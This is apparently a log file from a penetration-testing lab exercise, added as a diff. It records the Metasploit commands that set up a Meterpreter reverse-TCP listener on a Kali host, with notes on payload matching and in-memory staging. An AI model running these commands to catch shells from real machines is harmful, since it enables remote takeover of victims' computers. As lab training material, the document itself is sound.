@@ -1,0 +1,26 @@
+=============================================================================
+DAY 4 (S08) - METASPLOIT MULTI/HANDLER LISTENER CONFIGURATION
+=============================================================================
+Date: 2026-11-09
+Attacker Host: Kali Linux (10.50.20.10) [Offensive Zone - VMnet3]
+Listening Port: 4433
+Payload Target: windows/meterpreter/reverse_tcp
+
+Configuration Transcript:
+-----------------------------------------------------------------------------
+msf > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.50.20.10
+LHOST => 10.50.20.10
+msf exploit(multi/handler) > set LPORT 4433
+LPORT => 4433
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.50.20.10:4433
+
+Technical Notes:
+-----------------------------------------------------------------------------
+- Payload matching: The handler PAYLOAD must exactly match the payload string used during msfvenom generation (windows/meterpreter/reverse_tcp).
+- Interface binding: Configured to 10.50.20.10. In multi-interface or tunneled setups, 0.0.0.0 is used to accept callbacks across all virtual network adapters.
+- Staging mechanism: The listener waits for the initial 355-byte TCP handshake from the victim, after which it will inject the second-stage Meterpreter DLL directly into target memory.
